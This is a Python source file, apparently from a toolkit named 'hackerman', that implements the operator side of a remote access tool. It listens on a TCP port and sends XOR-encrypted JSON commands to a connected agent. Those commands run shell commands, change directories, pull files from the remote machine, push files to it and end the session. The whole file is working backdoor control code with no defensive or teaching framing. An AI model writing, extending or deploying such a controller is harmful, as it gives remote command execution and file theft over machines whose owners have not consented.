from hackerman.transport import tcp
from hackerman.crypto import xor
from hackerman import utils
import json, _thread

class Handler(object):
	def __init__(self, port, password):
		self.conn = tcp.Server(port)
		self.pwd = password

	def do_msg(self, msg):
		dat = json.dumps(msg).encode()
		enc = xor.encrypt(dat,self.pwd)

		self.conn.send(enc)
		res = self.conn.recv()

		dec = xor.decrypt(res,self.pwd).decode()
		t_r = json.loads(dec)

		return t_r

	def sh(self, cmd, bg=False):
		msg = {"type":"sh","cmd":cmd,"bg":bg}
		res = self.do_msg(msg)
		return utils.b64d(res['res'])

	def cd(self, newdir, bg=False):
		msg = {"type":"cd","dir":newdir,"bg":bg}
		res = self.do_msg(msg)
		return res['res']

	# def exec(self, cmd, bg=False):
	# 	out = utils.safe_uid()
	# 	cmd = out+"="+cmd
	# 	msg = {"type":"exec","cmd":cmd,"out":out,"bg":bg}
	# 	res = self.do_msg(msg)
	# 	return utils.b64d(res['res'])

	def dl(self, fn, bg=False):
		msg = {"type":"dl","fn":fn,"bg":bg}
		res = self.do_msg(msg)
		return utils.b64d(res['res'])

	def ul(self, in_file, out_file, bg=False):
		msg = {"type":"ul","fn":out_file,"data":utils.b64e(open(in_file,"rb").read()),"bg":bg}
		res = self.do_msg(msg)
		return res['res']

	def exit(self):
		msg = {"type":"exit","bg":False}
		res = self.do_msg(msg)
		return res['res']

